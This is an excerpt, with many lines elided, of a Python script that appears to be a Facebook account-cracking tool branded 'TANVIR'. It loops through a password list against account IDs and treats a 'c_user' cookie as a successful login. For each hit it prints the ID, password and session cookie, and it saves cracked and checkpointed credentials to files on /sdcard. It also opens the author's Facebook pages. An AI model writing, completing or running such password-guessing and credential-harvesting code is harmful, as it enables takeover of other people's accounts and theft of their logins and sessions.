...
def FD():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://www.facebook.com/K4NG.T4NV1R')
...
def o():
    ...
    if opt == '2':
        ...
        os.system('xdg-open https://www.facebook.com/XAIKO.TANVIR.326')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m[TANVIR-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/TANVIR-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m[TANVIR-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/TANVIR-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write(' %s[TANVIR 💥] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
